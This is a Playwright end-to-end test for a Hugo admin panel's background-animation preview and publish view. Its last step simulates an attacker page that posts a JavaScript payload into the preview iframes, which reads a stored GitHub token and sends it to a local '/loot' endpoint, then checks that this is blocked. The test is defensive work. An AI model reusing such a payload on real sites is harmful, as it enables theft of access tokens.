// tests/admin/e2e-background.mjs — Playwright end-to-end test for the 背景动画 view
// (views/background.js + cassette-frame.html / js/cassette-frame.js).
//
// Run from the repo root:   node tests/admin/e2e-background.mjs
// Env:
//   BG_E2E_DIR   where the Hugo builds + screenshots go (default: <os tmp>/admin-e2e-background)
//   HUGO_BIN     Hugo binary (see mock-github.mjs)
//
// The admin JS is served live from static/admin (mock adminDir). Every request to another origin
// (cdn.jsdelivr.net, github.io, api.github.com …) is aborted by openAdmin(). Assertions are made on the
// MOCK's resulting files and on a Hugo build of them, not only on the UI.
//
// The cassette previews are cross-origin sandboxed iframes (sandbox="allow-scripts", origin "null"), so the
// test talks to them the same way the admin does: postMessage({ type: 'stats' }) → painted-pixel count,
// frame counter, canvas size and a pixel signature (implemented in static/admin/js/cassette-frame.js).

import { createRequire } from 'node:module';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import http from 'node:http';
import os from 'node:os';
import path from 'node:path';
import { startMock, buildSite, openAdmin, REPO_ROOT } from './mock-github.mjs';

const { chromium } = createRequire(import.meta.url)('playwright');

const OUT = path.resolve(process.env.BG_E2E_DIR || path.join(os.tmpdir(), 'admin-e2e-background'));
const SITE_DIR = path.join(OUT, 'site');
const SHOTS = path.join(OUT, 'screenshots');
const ADMIN_DIR = path.join(REPO_ROOT, 'static', 'admin');
fs.mkdirSync(SHOTS, { recursive: true });

const P_PARAMS = 'config/_default/params.toml';
const P_EFFECTS = 'assets/js/background/effects';
const P_THREE = `${P_EFFECTS}/three-body.js`;

// ---------------------------------------------------------------------------
// tiny runner (sequential; later steps build on earlier ones)

const results = [];
async function step(name, fn) {
  const t0 = Date.now();
  let timer;
  try {
    await Promise.race([fn(), new Promise((_, rej) => { timer = setTimeout(() => rej(new Error('step timed out after 120 s')), 120000); })]);
    clearTimeout(timer);
    results.push({ name, ok: true });
    console.log(`  ✓ ${name} (${Date.now() - t0} ms)`);
  } catch (err) {
    clearTimeout(timer);
    results.push({ name, ok: false, err });
    console.log(`  ✗ ${name}\n      ${String((err && err.stack) || err).split('\n').slice(0, 10).join('\n      ')}`);
  }
}

// ---------------------------------------------------------------------------
// helpers

const tid = (id) => `[data-testid="${id}"]`;
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const waitView = (page, route) => page.waitForSelector(`body[data-view-ready="${route}"]`, { state: 'attached', timeout: 20000 });

/** Ask a cassette iframe (by data-testid) for its stats via postMessage, from the admin page. */
async function frameStats(page, testid, probe) {
  return page.evaluate(({ testid, probe }) => new Promise((resolve, reject) => {
    const f = document.querySelector(`[data-testid="${testid}"]`);
    if (!f || !f.contentWindow) { reject(new Error(`no frame ${testid}`)); return; }
    const id = Math.random().toString(36).slice(2);
    const timer = setTimeout(() => { removeEventListener('message', on); reject(new Error(`stats timeout for ${testid}`)); }, 5000);
    function on(ev) {
      if (ev.source === f.contentWindow && ev.data && ev.data.type === 'stats' && ev.data.id === id) {
        clearTimeout(timer);
        removeEventListener('message', on);
        resolve(ev.data);
      }
    }
    addEventListener('message', on);
    f.contentWindow.postMessage({ type: 'stats', id, probe }, '*');
  }), { testid, probe });
}

/** Poll until stats(testid) satisfies pred. */
async function waitStats(page, testid, pred, { timeout = 15000, probe } = {}) {
  const t0 = Date.now();
  let last = null;
  while (Date.now() - t0 < timeout) {
    try {
      last = await frameStats(page, testid, probe);
      if (pred(last)) return last;
    } catch (e) {
      last = { error: e.message };
    }
    await sleep(200);
  }
  throw new Error(`stats for ${testid} never matched: ${JSON.stringify(last)}`);
}

/** Wait until the large stage has been (re)started after run id `prevRun` and is running. */
async function waitLargeRestart(page, prevRun, timeout = 10000) {
  await page.waitForFunction((prev) => {
    const s = document.querySelector('[data-testid="bg-stage"]');
    return s && Number(s.dataset.run) > prev && s.dataset.state === 'running';
  }, prevRun, { timeout });
  return Number(await page.$eval(tid('bg-stage'), (s) => s.dataset.run));
}

const largeRun = (page) => page.$eval(tid('bg-stage'), (s) => Number(s.dataset.run));

async function waitCommits(mock, n, timeout = 20000) {
  const t0 = Date.now();
  while (mock.commits.length < n) {
    if (Date.now() - t0 > timeout) throw new Error(`expected ${n} commits, have ${mock.commits.length}`);
    await sleep(100);
  }
}

/** Positional line diff for files with the same line count. */
function changedLines(before, after) {
  const a = before.split('\n');
  const b = after.split('\n');
  assert.equal(b.length, a.length, 'line count must not change');
  const out = [];
  a.forEach((l, i) => { if (l !== b[i]) out.push({ line: i + 1, before: l, after: b[i] }); });
  return out;
}

async function noHorizontalScroll(page, label) {
  const m = await page.evaluate(() => ({ sw: document.documentElement.scrollWidth, cw: document.documentElement.clientWidth }));
  assert.ok(m.sw <= m.cw + 1, `${label}: horizontal scroll (${m.sw} > ${m.cw})`);
}

// ---------------------------------------------------------------------------

console.log('e2e-background');
const mock = await startMock({ siteDir: SITE_DIR, adminDir: ADMIN_DIR, runDelayMs: 600 });
const original = {
  params: mock.readFile(P_PARAMS),
  three: mock.readFile(P_THREE),
  lorenz: mock.readFile(`${P_EFFECTS}/lorenz.js`),
};
console.log(`  building site into ${SITE_DIR} …`);
await buildSite({ repoDir: REPO_ROOT, outDir: SITE_DIR, baseURL: mock.url + '/' });

const browser = await chromium.launch();
const context = await browser.newContext({ viewport: { width: 1280, height: 800 }, colorScheme: 'light' });
const page = await context.newPage();
const pageErrors = [];
page.on('pageerror', (e) => pageErrors.push(e.message));
page.on('console', (m) => {
  if (m.type() === 'error' && !/ERR_BLOCKED_BY_CLIENT|Failed to load resource/.test(m.text())) pageErrors.push(`console: ${m.text()}`);
});

try {
  await step('opens #/background and lists all three cassettes with names + descriptions', async () => {
    await openAdmin(page, mock, { path: '/admin/#/background' });
    await waitView(page, 'background');
    await page.waitForSelector(tid('bg-cards'));
    const cards = await page.$$eval('[data-testid^="bg-card-"][data-effect]', (els) => els.map((e) => ({
      name: e.dataset.effect,
      title: e.querySelector('[data-testid="bg-card-title"]').textContent,
      desc: e.querySelector('[data-testid="bg-card-desc"]').textContent,
      badges: [...e.querySelectorAll('[data-testid="bg-card-badge"]')].map((b) => b.textContent),
      checked: e.getAttribute('aria-checked'),
    })));
    assert.deepEqual(cards.map((c) => c.name), ['flow-field', 'lorenz', 'three-body']);
    const by = Object.fromEntries(cards.map((c) => [c.name, c]));
    assert.equal(by['three-body'].title, '三体运动');
    assert.equal(by.lorenz.title, '洛伦兹吸引子');
    assert.equal(by['flow-field'].title, '流场粒子');
    assert.match(by['three-body'].desc, /N 体引力/);
    assert.match(by.lorenz.desc, /Lorenz 方程/);
    assert.match(by['flow-field'].desc, /向量场/);
    assert.deepEqual(by['three-body'].badges, ['使用中']);
    assert.deepEqual(by.lorenz.badges, []);
    assert.equal(by['three-body'].checked, 'true', 'the effect in use is selected initially');
    assert.equal(await page.$eval(tid('bg-preview-title'), (e) => e.textContent), '三体运动');
    assert.equal(await page.isChecked(tid('bg-enabled')), true);
    assert.equal(await page.getAttribute(tid('bg-autoplay-home'), 'aria-checked'), 'true');
    assert.ok(await page.isDisabled(tid('bg-save')), 'save is disabled while nothing changed');
  });

  await step('preview iframes are sandboxed (allow-scripts only, opaque origin)', async () => {
    const info = await page.$$eval('iframe.bga-frame', (fs) => fs.map((f) => ({
      sandbox: f.getAttribute('sandbox'), src: f.getAttribute('src'), doc: f.contentDocument === null,
    })));
    assert.equal(info.length, 4, '3 mini previews + 1 large preview');
    for (const f of info) {
      assert.equal(f.sandbox, 'allow-scripts');
      assert.match(f.src, /\/admin\/cassette-frame\.html$/);
      assert.ok(f.doc, 'parent must not be able to reach into the frame (no allow-same-origin)');
    }
    const html = fs.readFileSync(path.join(ADMIN_DIR, 'cassette-frame.html'), 'utf8');
    assert.ok(!/<script(?![^>]*\bsrc=)[^>]*>/i.test(html), 'no inline <script> in cassette-frame.html');
    assert.ok(!/Content-Security-Policy/i.test(html), 'no CSP meta in cassette-frame.html');
    assert.match(html, /<script src="js\/cassette-frame\.js"><\/script>/);
  });

  await step('mini previews actually animate (painted pixels + frames advance + pixels change)', async () => {
    for (const name of ['flow-field', 'lorenz', 'three-body']) {
      const id = `bg-mini-frame-${name}`;
      const s1 = await waitStats(page, id, (s) => s.running && s.frames > 10 && s.painted > 20);
      assert.equal(s1.width, 960);
      assert.equal(s1.height, 540);
      await sleep(700);
      const s2 = await frameStats(page, id);
      assert.ok(s2.frames > s1.frames, `${name}: frames should advance (${s1.frames} → ${s2.frames})`);
      assert.notEqual(s2.signature, s1.signature, `${name}: canvas pixels should change over time`);
      assert.ok(s2.painted > 20, `${name}: painted=${s2.painted}`);
    }
  });

  await step('select lorenz → large preview runs it; light/dark toggle and phone screen', async () => {
    let run = await largeRun(page);
    await page.click(tid('bg-card-lorenz'));
    run = await waitLargeRestart(page, run);
    assert.equal(await page.$eval(tid('bg-preview-title'), (e) => e.textContent), '洛伦兹吸引子');
    assert.equal(await page.getAttribute(tid('bg-card-lorenz'), 'aria-checked'), 'true');
    let s = await waitStats(page, 'bg-stage-frame', (x) => x.running && x.painted > 20 && x.frames > 5, { probe: 'RHO: 28,' });
    assert.equal(s.probeFound, true, 'large frame runs the lorenz code');
    assert.equal(s.width, 1280);
    assert.equal(s.dark, false);

    await page.click(tid('bg-theme-dark'));
    run = await waitLargeRestart(page, run);
    s = await waitStats(page, 'bg-stage-frame', (x) => x.running && x.painted > 20);
    assert.equal(s.dark, true, 'dark toggle → frame runs in dark mode');
    assert.equal(await page.getAttribute(tid('bg-theme-dark'), 'aria-checked'), 'true');
    // the minis follow the theme too
    s = await waitStats(page, 'bg-mini-frame-flow-field', (x) => x.running && x.dark === true);
    await page.screenshot({ path: path.join(SHOTS, 'desktop-dark-preview.png') });

    await page.click(tid('bg-theme-light'));
    run = await waitLargeRestart(page, run);
    s = await waitStats(page, 'bg-stage-frame', (x) => x.running);
    assert.equal(s.dark, false);

    await page.click(tid('bg-device-phone'));
    run = await waitLargeRestart(page, run);
    s = await waitStats(page, 'bg-stage-frame', (x) => x.running && x.width > 0);
    assert.equal(s.width, 390);
    assert.equal(s.height, 844);
    await page.click(tid('bg-device-desktop'));
    run = await waitLargeRestart(page, run);

    await page.click(tid('bg-restart'));
    run = await waitLargeRestart(page, run);
    s = await waitStats(page, 'bg-stage-frame', (x) => x.running);
    assert.ok(s.frames < 400, 'restart starts from scratch');
  });

  await step('「用作网站背景」+ autoplay → savebar lists the changes', async () => {
    await page.click(tid('bg-use'));
    await page.waitForSelector(tid('bg-in-use'));
    assert.match(await page.textContent(tid('bg-in-use')), /发布后生效/);
    assert.match(await page.textContent(tid('bg-current-effect')), /洛伦兹吸引子/);
    const badges = await page.$$eval(`${tid('bg-card-lorenz')} ${tid('bg-card-badge')}`, (b) => b.map((x) => x.textContent));
    assert.deepEqual(badges, ['发布后启用']);
    await page.click(tid('bg-autoplay-all'));
    assert.equal(await page.getAttribute(tid('bg-autoplay-all'), 'aria-checked'), 'true');
    const hint = await page.textContent(tid('bg-save-hint'));
    assert.match(hint, /三体运动 → 洛伦兹吸引子/);
    assert.match(hint, /仅首页 → 所有页面/);
    assert.ok(!(await page.isDisabled(tid('bg-save'))));
  });

  await step('「恢复默认」resets a tuned parameter', async () => {
    let run = await largeRun(page);
    await page.fill(tid('bg-param-SCALE'), '20');
    run = await waitLargeRestart(page, run);
    await waitStats(page, 'bg-stage-frame', (x) => x.probeFound === true, { probe: 'SCALE: 20,' });
    assert.ok(await page.$eval(tid('bg-param-SCALE'), (e) => e.closest('.field').classList.contains('is-changed')));
    await page.click(tid('bg-reset-params'));
    assert.equal(await page.inputValue(tid('bg-param-SCALE')), '12');
    run = await waitLargeRestart(page, run);
    await waitStats(page, 'bg-stage-frame', (x) => x.probeFound === true, { probe: 'SCALE: 12,' });
    assert.ok(await page.isDisabled(tid('bg-reset-params')));
  });

  await step('tune three-body STAR_COUNT 3 → 4 → live preview restarts with the new value', async () => {
    let run = await largeRun(page);
    await page.click(tid('bg-card-three-body'));
    run = await waitLargeRestart(page, run);
    assert.equal(await page.inputValue(tid('bg-param-STAR_COUNT')), '3');
    // labels come from the line comments
    assert.match(await page.$eval(tid('bg-param-STAR_COUNT'), (e) => e.closest('.field').querySelector('label').textContent), /星体数量/);
    // BETA: 8 / 3 is an expression → not offered (lorenz); three-body has 10 numeric params
    assert.equal(await page.$$eval('[data-testid^="bg-param-"]:not([data-testid^="bg-param-default"])', (e) => e.length), 10);
    await page.fill(tid('bg-param-STAR_COUNT'), '4');
    run = await waitLargeRestart(page, run);
    const s = await waitStats(page, 'bg-stage-frame', (x) => x.running && x.painted > 0, { probe: 'STAR_COUNT: 4,' });
    assert.equal(s.probeFound, true, 'preview restarted with STAR_COUNT: 4');
    const badges = await page.$$eval(`${tid('bg-card-three-body')} ${tid('bg-card-badge')}`, (b) => b.map((x) => x.textContent));
    assert.deepEqual(badges, ['使用中', '参数已改']);
    assert.match(await page.textContent(tid('bg-save-hint')), /星体数量 3 → 4/);
  });

  await step('invalid number blocks publishing with a clear message', async () => {
    const before = mock.commits.length;
    await page.fill(tid('bg-param-G'), '');
    assert.equal(await page.getAttribute(tid('bg-param-G'), 'aria-invalid'), 'true');
    await page.click(tid('bg-save'));
    const t = await page.waitForSelector(tid('toast-warning'));
    assert.match(await t.textContent(), /不是有效的数字/);
    await sleep(300);
    assert.equal(mock.commits.length, before, 'nothing committed');
    await page.click(tid('bg-param-default-G'));
    assert.equal(await page.inputValue(tid('bg-param-G')), '0.5');
    assert.equal(await page.getAttribute(tid('bg-param-G'), 'aria-invalid'), 'false');
  });

  await step('router guard: leaving with unpublished changes asks first', async () => {
    await page.click(tid('nav-posts'));
    await page.waitForSelector(tid('confirm-cancel'));
    await page.click(tid('confirm-cancel'));
    await sleep(300);
    assert.equal(await page.evaluate(() => location.hash), '#/background');
    assert.equal(await page.inputValue(tid('bg-param-STAR_COUNT')), '4', 'edits kept');
  });

  await step('desktop screenshot + no horizontal scroll', async () => {
    await page.evaluate(() => window.scrollTo(0, 0));
    await sleep(800);
    await page.screenshot({ path: path.join(SHOTS, 'desktop.png') });
    await page.screenshot({ path: path.join(SHOTS, 'desktop-full.png'), fullPage: true });
    await noHorizontalScroll(page, 'desktop');
  });

  await step('保存并发布 → one commit: params.toml (comments intact) + three-body.js (one line)', async () => {
    const before = mock.commits.length;
    await page.click(tid('bg-save'));
    await waitCommits(mock, before + 1);
    await page.waitForSelector(tid('overlay'), { state: 'detached', timeout: 15000 });
    await page.waitForSelector(`${tid('bg-save')}[disabled]`, { timeout: 15000 });
    const commit = mock.commits[mock.commits.length - 1];
    assert.match(commit.message, /^admin: 背景动画/);
    assert.match(commit.message, /洛伦兹吸引子/);
    assert.deepEqual(commit.changes.map((c) => c.path).sort(), [P_THREE, P_PARAMS].sort());

    const params = mock.readFile(P_PARAMS);
    assert.deepEqual(changedLines(original.params, params), [
      { line: original.params.split('\n').indexOf('  effect = "three-body"') + 1, before: '  effect = "three-body"', after: '  effect = "lorenz"' },
      { line: original.params.split('\n').indexOf('  autoplay = "home"') + 1, before: '  autoplay = "home"', after: '  autoplay = "all"' },
    ]);
    assert.ok(params.includes('#   lorenz       洛伦兹吸引子'), 'comments intact');

    const three = mock.readFile(P_THREE);
    assert.deepEqual(changedLines(original.three, three), [{
      line: original.three.split('\n').findIndex((l) => l.startsWith('    STAR_COUNT:')) + 1,
      before: '    STAR_COUNT: 3,         // 星体数量',
      after: '    STAR_COUNT: 4,         // 星体数量',
    }]);
    assert.equal(mock.readFile(`${P_EFFECTS}/lorenz.js`), original.lorenz, 'lorenz.js untouched (SCALE was reset)');

    // UI settled on the new base
    const badges = await page.$$eval(`${tid('bg-card-lorenz')} ${tid('bg-card-badge')}`, (b) => b.map((x) => x.textContent));
    assert.deepEqual(badges, ['使用中']);
    assert.equal(await page.textContent(tid('bg-param-default-STAR_COUNT')), '默认 4');
    assert.equal(await page.textContent(tid('bg-save-hint')), '没有未发布的修改');
    await page.waitForSelector(`${tid('deploy-indicator')}[data-state="success"]`, { timeout: 15000 });
  });

  await step('Hugo build of the published repo uses background-lorenz and autoplays everywhere', async () => {
    const repoDir = path.join(OUT, 'export');
    fs.rmSync(repoDir, { recursive: true, force: true });
    mock.exportTo(repoDir);
    const outDir = path.join(OUT, 'site-after');
    await buildSite({ repoDir, outDir, baseURL: mock.url + '/' });
    const home = fs.readFileSync(path.join(outDir, 'index.html'), 'utf8');
    const m = /<script[^>]+src=["']?([^"' >]*background-lorenz[^"' >]*\.js)["']?[^>]*>/.exec(home);
    assert.ok(m, 'home page references background-lorenz.*.js');
    assert.ok(!/background-three-body/.test(home));
    assert.match(m[0], /data-autoplay=["']?true/);
    const js = fs.readFileSync(path.join(outDir, m[1].replace(/^https?:\/\/[^/]+\//, '').replace(/^\//, '')), 'utf8');
    assert.ok(js.includes('BG_System'), 'bundle contains the engine');
    // autoplay = "all" → a non-home page autoplays too
    const about = fs.readFileSync(path.join(outDir, 'about', 'index.html'), 'utf8');
    assert.match(about, /background-lorenz[^>]*data-autoplay=["']?true/);
  });

  await step('conflict: external edit of params.toml → reload keeps the user edit → publish both', async () => {
    const external = mock.readFile(P_PARAMS) + '# external edit\n';
    mock.setFile(P_PARAMS, external);
    await page.click(tid('bg-enabled'), { force: true }).catch(async () => {
      await page.$eval(tid('bg-enabled'), (e) => e.click());
    });
    assert.equal(await page.isChecked(tid('bg-enabled')), false);
    assert.ok(await page.isDisabled(tid('bg-autoplay-all')), 'autoplay is disabled while the animation is off');
    const before = mock.commits.length;
    await page.click(tid('bg-save'));
    await page.waitForSelector(tid('conflict-reload'));
    await page.click(tid('conflict-reload'));
    await page.waitForSelector(tid('toast-info'));
    assert.equal(await page.isChecked(tid('bg-enabled')), false, 'user edit kept after reload');
    assert.equal(mock.commits.length, before);
    await page.click(tid('bg-save'));
    await waitCommits(mock, before + 1);
    await page.waitForSelector(`${tid('bg-save')}[disabled]`, { timeout: 15000 });
    const params = mock.readFile(P_PARAMS);
    assert.ok(params.endsWith('# external edit\n'), 'external edit preserved');
    assert.deepEqual(changedLines(external, params).map((c) => c.after), ['  enabled = false']);
    assert.match(params, /\[background\]\n {2}enabled = false/);
  });

  await step('turn it back on; discard flow', async () => {
    await page.$eval(tid('bg-enabled'), (e) => e.click());
    await page.click(tid('bg-autoplay-home'));
    await page.click(tid('bg-discard'));
    await page.click(tid('confirm-ok'));
    await page.waitForSelector(`${tid('bg-save')}[disabled]`);
    assert.equal(await page.isChecked(tid('bg-enabled')), false, 'discard restores the published state');
    await page.$eval(tid('bg-enabled'), (e) => e.click());
    const before = mock.commits.length;
    await page.click(tid('bg-save'));
    await waitCommits(mock, before + 1);
    await page.waitForSelector(`${tid('bg-save')}[disabled]`, { timeout: 15000 });
    assert.match(mock.readFile(P_PARAMS), /\[background\]\n {2}enabled = true/);
  });

  await step('leaving the view removes all preview iframes', async () => {
    await page.click(tid('nav-posts'));
    await waitView(page, 'posts');
    assert.equal(await page.$$eval('iframe.bga-frame', (f) => f.length), 0);
  });

  await step('mobile (390×844 and 360): list layout, no horizontal scroll, offscreen minis pause', async () => {
    const mctx = await browser.newContext({ viewport: { width: 390, height: 844 }, deviceScaleFactor: 2, isMobile: true, hasTouch: true });
    const mp = await mctx.newPage();
    mp.on('pageerror', (e) => pageErrors.push(`mobile: ${e.message}`));
    await openAdmin(mp, mock, { path: '/admin/#/background' });
    await waitView(mp, 'background');
    await waitStats(mp, 'bg-mini-frame-lorenz', (s) => s.running && s.painted > 0);
    await sleep(800);
    await mp.screenshot({ path: path.join(SHOTS, 'mobile.png') });
    await mp.screenshot({ path: path.join(SHOTS, 'mobile-full.png'), fullPage: true });
    await noHorizontalScroll(mp, 'mobile 390');
    // tuning area
    await mp.click(tid('bg-card-three-body'));
    await mp.$eval(tid('bg-tune'), (e) => e.scrollIntoView());
    await sleep(500);
    const s = await frameStats(mp, 'bg-mini-frame-flow-field');
    assert.equal(s.paused, true, 'offscreen mini preview is paused');
    await mp.screenshot({ path: path.join(SHOTS, 'mobile-tune.png') });
    await mp.setViewportSize({ width: 360, height: 740 });
    await sleep(300);
    await noHorizontalScroll(mp, 'mobile 360');
    await mp.evaluate(() => window.scrollTo(0, 0));
    await mp.screenshot({ path: path.join(SHOTS, 'mobile-360.png') });
    await mctx.close();
  });

  await step('unpublished changes survive a killed tab (no beforeunload): 恢复 / 丢弃 banner', async () => {
    const lctx = await browser.newContext({ viewport: { width: 1280, height: 800 }, colorScheme: 'light' });
    try {
      const p1 = await lctx.newPage();
      p1.on('pageerror', (e) => pageErrors.push(`local: ${e.message}`));
      await openAdmin(p1, mock, { path: '/admin/#/background' });
      await waitView(p1, 'background');
      assert.equal(await p1.$$eval(tid('bg-local-draft'), (e) => e.length), 0, 'no banner without a saved draft');
      const publishedStars = await (async () => {
        await p1.click(tid('bg-card-three-body'));
        return p1.inputValue(tid('bg-param-STAR_COUNT'));
      })();
      const stars = String(Number(publishedStars) + 1);
      await p1.fill(tid('bg-param-STAR_COUNT'), stars);
      const wasNone = await p1.getAttribute(tid('bg-autoplay-none'), 'aria-checked');
      const target = wasNone === 'true' ? 'home' : 'none';
      await p1.click(tid(`bg-autoplay-${target}`));
      assert.equal(await p1.isDisabled(tid('bg-save')), false);
      const commitsBefore = mock.commits.length;
      // iOS closing the tab / the system killing a background tab: no beforeunload, nothing else runs
      await p1.close({ runBeforeUnload: false });

      const p2 = await lctx.newPage();
      p2.on('pageerror', (e) => pageErrors.push(`local: ${e.message}`));
      await openAdmin(p2, mock, { path: '/admin/#/background' });
      await waitView(p2, 'background');
      await p2.waitForSelector(tid('bg-local-draft'));
      assert.match(await p2.textContent(tid('bg-local-draft')), /发现本机未发布的背景动画修改/);
      assert.equal(await p2.isDisabled(tid('bg-save')), true, 'nothing applied before the user chooses');
      await p2.click(tid('bg-local-restore'));
      await p2.waitForSelector(tid('bg-local-draft'), { state: 'detached' });
      assert.equal(await p2.getAttribute(tid(`bg-autoplay-${target}`), 'aria-checked'), 'true', 'autoplay choice restored');
      assert.equal(await p2.inputValue(tid('bg-param-STAR_COUNT')), stars, 'tuned parameter restored');
      assert.equal(await p2.isDisabled(tid('bg-save')), false);
      assert.match(await p2.textContent(tid('bg-save-hint')), /有 2 项修改未发布/);
      assert.equal(mock.commits.length, commitsBefore, 'restoring never publishes');
      await p2.close({ runBeforeUnload: false });

      // 丢弃 → gone for good
      const p3 = await lctx.newPage();
      await openAdmin(p3, mock, { path: '/admin/#/background' });
      await waitView(p3, 'background');
      await p3.waitForSelector(tid('bg-local-draft'));
      await p3.click(tid('bg-local-discard'));
      await p3.click(tid('confirm-ok'));
      await p3.waitForSelector(tid('bg-local-draft'), { state: 'detached' });
      assert.equal(await p3.isDisabled(tid('bg-save')), true);
      await p3.reload();
      await waitView(p3, 'background');
      await sleep(300);
      assert.equal(await p3.$$eval(tid('bg-local-draft'), (e) => e.length), 0, 'discarded draft does not come back');

      // a confirmed 「仍然离开」 also forgets it; a clean state stores nothing
      await p3.click(tid('bg-card-three-body'));
      await p3.fill(tid('bg-param-STAR_COUNT'), stars);
      assert.ok(await p3.evaluate(() => localStorage.getItem('admin.bg.unpublished')), 'edit stored locally right away');
      await p3.click(tid('nav-posts'));
      await p3.click(tid('confirm-ok'));
      await waitView(p3, 'posts');
      assert.equal(await p3.evaluate(() => localStorage.getItem('admin.bg.unpublished')), null);
      assert.equal(mock.commits.length, commitsBefore);
      await p3.close({ runBeforeUnload: false });
    } finally {
      await lctx.close();
    }
  });

  await step('security: another website cannot run code through cassette-frame.html (token stays private)', async () => {
    // GitHub Pages sends no X-Frame-Options, so any site can frame /admin/cassette-frame.html. The frame must
    // refuse to run posted code unless it is inside the admin's own sandbox (origin "null", parent = admin).
    const SECRET = 'github_pat_E2E_BG_SECRET_TOKEN';
    const victim = new URL(mock.url).origin;              // http://127.0.0.1:<port>
    const frameUrl = `${victim}/admin/cassette-frame.html`;
    const loot = [];
    const attackerHtml = `<!doctype html><meta charset="utf-8"><title>attacker</title>
      <iframe id="plain" src="${frameUrl}"></iframe>
      <iframe id="sbx" sandbox="allow-scripts" src="${frameUrl}"></iframe>
      <iframe id="sbxso" sandbox="allow-scripts allow-same-origin" src="${frameUrl}"></iframe>
      <script>
        window.got = [];
        addEventListener('message', (ev) => { window.got.push({ from: ev.source && ev.source.frameElement ? ev.source.frameElement.id : '?', data: ev.data }); });
        const payload = "window.__pwned = 1; var t = null; try { t = localStorage.getItem('admin.token'); } catch (e) { t = 'ERR'; }" +
          "try { parent.postMessage({ type: 'pwned', token: t }, '*'); } catch (e) {}" +
          "try { fetch(" + JSON.stringify(location.origin + '/loot') + " + '?t=' + encodeURIComponent(String(t)), { mode: 'no-cors' }); } catch (e) {}";
        function fire() {
          for (const f of document.querySelectorAll('iframe')) {
            try { f.contentWindow.postMessage({ type: 'run', code: payload, dark: false }, '*'); } catch (e) {}
          }
        }
        window.fire = fire;
      </script>`;
    const atk = http.createServer((req, res) => {
      if (req.url.startsWith('/loot')) { loot.push(req.url); res.end('ok'); return; }
      res.writeHead(200, { 'content-type': 'text/html; charset=utf-8' });
      res.end(attackerHtml);
    });
    await new Promise((r) => atk.listen(0, '127.0.0.1', r));
    const attacker = `http://localhost:${atk.address().port}`;   // a different site than 127.0.0.1
    const actx = await browser.newContext();
    try {
      // the victim has a remembered token on the admin's origin
      const vp = await actx.newPage();
      await vp.goto(frameUrl);
      await vp.evaluate((t) => localStorage.setItem('admin.token', t), SECRET);
      assert.equal(await vp.evaluate(() => localStorage.getItem('admin.token')), SECRET);
      await vp.close();

      const ap = await actx.newPage();
      await ap.goto(attacker + '/', { waitUntil: 'load' });   // 'load' waits for the iframes too
      await sleep(300);
      // the three frames really loaded the cassette page (so a refusal below is the guard, not a load failure)
      const framed = ap.frames().filter((f) => f.url() === frameUrl);
      assert.equal(framed.length, 3, 'attacker page framed cassette-frame.html three times');
      for (const f of framed) assert.equal(await f.evaluate(() => document.title), '背景动画预览');
      for (let i = 0; i < 5; i++) { await ap.evaluate(() => window.fire()); await sleep(200); }
      await sleep(800);
      for (const f of framed) {
        const r = await f.evaluate(() => ({ pwned: window.__pwned === 1, scripts: document.scripts.length, origin: self.origin }));
        assert.equal(r.pwned, false, `posted code must not run in a frame with origin ${r.origin}`);
        assert.equal(r.scripts, 1, `no script was injected (origin ${r.origin})`);
      }
      const got = await ap.evaluate(() => window.got);
      assert.deepEqual(got.filter((g) => g.data && g.data.type === 'pwned'), [], 'no code ran');
      assert.deepEqual(got.filter((g) => g.data && ['ready', 'started', 'stats'].includes(g.data.type)), [], 'the frame does not talk to a foreign parent');
      assert.deepEqual(loot, [], 'the token never reached the attacker');
      await ap.close();
    } finally {
      await actx.close();
      await new Promise((r) => atk.close(r));
    }
  });

  await step('no page errors', async () => {
    assert.deepEqual(pageErrors, []);
  });
} finally {
  await browser.close();
  await mock.close();
}

const failed = results.filter((r) => !r.ok);
console.log(`\n${results.length - failed.length}/${results.length} passed; screenshots in ${SHOTS}`);
process.exit(failed.length ? 1 : 0);
